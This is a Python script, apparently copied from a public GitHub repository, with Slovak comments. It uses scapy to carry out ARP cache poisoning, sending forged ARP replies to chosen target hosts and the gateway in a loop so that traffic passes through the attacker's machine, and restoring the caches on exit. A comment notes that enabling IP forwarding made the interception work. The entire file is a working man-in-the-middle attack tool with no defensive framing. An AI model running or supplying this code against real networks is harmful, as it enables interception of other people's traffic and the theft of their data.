# toto je zdroj tohto kodu (cely tento subor)
# https://github.com/ickerwx/arpspoof/blob/master/arpspoof.py  
# sudo sysctl -w net.inet.ip.forwarding=1  vyriesilo problem s pristupom na siet ...tym som povolil priamy forwarding packetov

import sys
import argparse
import threading
import queue
import time
from scapy.all import *

# index values into tuples
IP = 0
MAC = TARGET = 1



def get_MAC(interface, target_IP):
    # get the MAC address of target_IP and return it
    print(interface, target_IP)
    
    source_IP = get_if_addr(interface)
    source_MAC = get_if_hwaddr(interface)
    p = ARP(hwsrc=source_MAC, psrc=source_IP)  # ARP request by default
    p.hwdst = 'ff:ff:ff:ff:ff:ff'
    p.pdst = target_IP
    reply, unans = sr(p, timeout=5, verbose=0)
    if len(unans) > 0:
        # received no reply
        raise Exception('Error finding MAC for %s, try using -i' % target_IP)
    return reply[0][1].hwsrc


def start_poison_thread(targets, gateway, control_queue, attacker_MAC):
    finish = False
    # the control queue is used to send commands to the poison thread
    # as soon as the thread finds the queue not empty, it will stop poisoning
    # and evaluate the item in the queue. It will process the command and then
    # either continue poisoning or finish its execution
    while not finish:
        # as long as no elements are in the queue, we will send ARP messages
        while control_queue.empty():
            for t in targets:
                send_ARP(t[IP], t[MAC], gateway[IP], attacker_MAC)
                send_ARP(gateway[IP], gateway[MAC], t[IP], attacker_MAC)
            time.sleep(2)

        # queue not empty, pull the element out of the queue to empty it again
        try:
            item = control_queue.get(block=False)
        except Empty:
            print ('Something broke.')
        
        cmd = item[0].lower()
        if cmd == 'quit':
            finish = True

    # we are done, reset every host
    restore_ARP_caches(targets, gateway)


def restore_ARP_caches(targets, gateway, verbose=True):
    print ('Stopping the attack, restoring ARP cache')
    for i in range(3):
        if verbose:
            print ("ARP %s is at %s" % (gateway[IP], gateway[MAC]))
        for t in targets:
            if verbose:
                print ("ARP %s is at %s" % (t[IP], t[MAC]))
            send_ARP(t[IP], t[MAC], gateway[IP], gateway[MAC])
            send_ARP(gateway[IP], gateway[MAC], t[IP], t[MAC])
        time.sleep(2)
    print ('Restored ARP caches')


def send_ARP(destination_IP, destination_MAC, source_IP, source_MAC):
    # op=2 is ARP response
    # psrc/hwsrc is the data we want the destination to have
    arp_packet = ARP(op=2, pdst=destination_IP, hwdst=destination_MAC,
                     psrc=source_IP, hwsrc=source_MAC)
    send(arp_packet, verbose=0)


# args_target are comma separated IP addresses
def spoofer(args_target):
    print(args_target)
    gateway = "192.168.1.1"
    control_queue = queue.Queue()
    interface = "en0"
    attacker_MAC = get_if_hwaddr(interface)

    print ('Attacking from interface %s (%s)' % (interface, attacker_MAC))
    try:
        # targets is a list of (IP, MAC) tuples
        targets = [(t.strip(), get_MAC(interface, t.strip())) for t in
                   args_target.split(',')]
    except Exception as e:
        # Exception most likely because get_MAC failed
        print (e)
        sys.exit(1)

    try:
        gateway = (gateway, get_MAC(interface, gateway))
    except Exception as e:
        print (e.message)
        sys.exit(2)

    # create and start the poison thread
    poison_thread = threading.Thread(target=start_poison_thread,
                                     args=(targets, gateway, control_queue,
                                           attacker_MAC))
    poison_thread.start()

    try:
        while poison_thread.is_alive():
            time.sleep(2) 

    except KeyboardInterrupt:
        # Ctrl+C detected, so let's finish the poison thread and exit
        control_queue.put(('quit',))
        poison_thread.join()
